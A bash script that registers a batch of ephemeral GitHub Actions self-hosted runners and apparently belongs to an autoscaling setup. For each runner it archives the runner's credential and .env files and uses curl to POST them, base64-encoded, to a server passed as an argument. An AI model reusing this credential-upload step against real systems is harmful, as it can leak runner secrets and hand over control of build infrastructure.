#!/bin/bash

node --version
npm --version

DATA=$(echo $1 | base64 -d)
TARGET_URL=$(echo ${DATA} | jq -r .url)
TARGET_TOKEN=$(echo ${DATA} | jq -r .token)
TARGET_TYPE=$(echo ${DATA} | jq -r .type)
TARGET_COUNT=$(echo ${DATA} | jq -r .count)

mkdir runners
cd actions-runner

USEFUL_FILES=".credentials .credentials_rsaparams .env .path .runner"

for i in `seq 1 $TARGET_COUNT`
do
    ls -a
    #configure runner
    RUNNER_NAME=sh-$TARGET_TYPE-${i}
    echo $RUNNER_NAME
    ./config.sh --url $TARGET_URL \
                --token $TARGET_TOKEN \
                --unattended \
                --replace \
                --name $RUNNER_NAME \
                --labels $TARGET_TYPE \
                --ephemeral #https://docs.github.com/en/actions/hosting-your-own-runners/autoscaling-with-self-hosted-runners#using-ephemeral-runners-for-autoscaling

    #archive useful info
    tar -acvf $RUNNER_NAME.tar.gz $USEFUL_FILES
    ls -a
    #convert archive to base64 and post it to outer server
    curl -H "Content-Type: text/plain" -d "$RUNNER_NAME|$(cat $RUNNER_NAME.tar.gz | base64 -w0)" -X POST $2

    rm -rf $USEFUL_FILES $RUNNER_NAME.tar.gz
done
curl -X POST $3
exit 0


